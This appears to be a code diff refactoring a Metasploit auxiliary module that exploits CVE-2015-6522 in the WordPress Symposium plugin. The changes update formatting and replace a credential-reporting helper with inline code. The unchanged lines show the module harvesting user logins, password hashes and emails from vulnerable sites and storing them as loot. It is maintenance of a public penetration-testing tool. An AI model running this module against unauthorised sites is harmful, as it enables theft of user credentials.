@@ -1,9 +1,7 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
-
-require 'msf/core'
 
 class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::HTTP::Wordpress
@@ -28,13 +26,13 @@ class MetasploitModule < Msf::Auxiliary
           ['CVE', '2015-6522'],
           ['EDB', '37824']
         ],
-      'DisclosureDate'  => 'Aug 18 2015'
+      'DisclosureDate'  => '2015-08-18'
       ))
 
     register_options(
       [
         OptString.new('URI_PLUGIN', [true, 'The WordPress Symposium Plugin URI', 'wp-symposium'])
-      ], self.class)
+      ])
   end
 
   def check
@@ -63,32 +61,6 @@ class MetasploitModule < Msf::Auxiliary
       vprint_error("#{peer} - The host was unreachable!")
       return nil
     end
-  end
-
-  def report_cred(opts)
-    service_data = {
-      address: opts[:ip],
-      port: opts[:port],
-      service_name: opts[:service_name],
-      protocol: 'tcp',
-      workspace_id: myworkspace_id
-    }
-
-    credential_data = {
-      origin_type: :service,
-      module_fullname: fullname,
-      username: opts[:user],
-      private_data: opts[:password],
-      private_type: :nonreplayable_hash,
-    }.merge(service_data)
-
-    login_data = {
-      core: create_credential(credential_data),
-      status: Metasploit::Model::Login::Status::UNTRIED,
-      proof: opts[:proof]
-    }.merge(service_data)
-
-    create_credential_login(login_data)
   end
 
   def run
@@ -129,14 +101,15 @@ class MetasploitModule < Msf::Auxiliary
         user_email = values[2]
 
         print_good("#{peer} - #{sprintf("%-15s %-34s %s", user_login, user_pass, user_email)}")
-        report_cred(
-          ip: rhost,
-          port: datastore['RPORT'],
-          service_name: datastore['SSL'] ? 'https' : 'http',
-          user: user_login,
-          password: user_pass,
-          proof: user_email
-        )
+        connection_details = {
+            module_fullname: self.fullname,
+            username: user_login,
+            private_data: user_pass,
+            private_type: :nonreplayable_hash,
+            status: Metasploit::Model::Login::Status::UNTRIED,
+            proof: user_email
+        }.merge(service_details)
+        create_credential(connection_details)
 
         credentials << "#{user_login},#{user_pass},#{user_email}\n"
       end
@@ -144,7 +117,7 @@ class MetasploitModule < Msf::Auxiliary
 
     unless credentials.empty?
       loot = store_loot("wp_symposium.http","text/plain", rhost, credentials)
-      vprint_status("Credentials saved in: #{loot}")
+      vprint_good("Credentials saved in: #{loot}")
     end
   end
 end
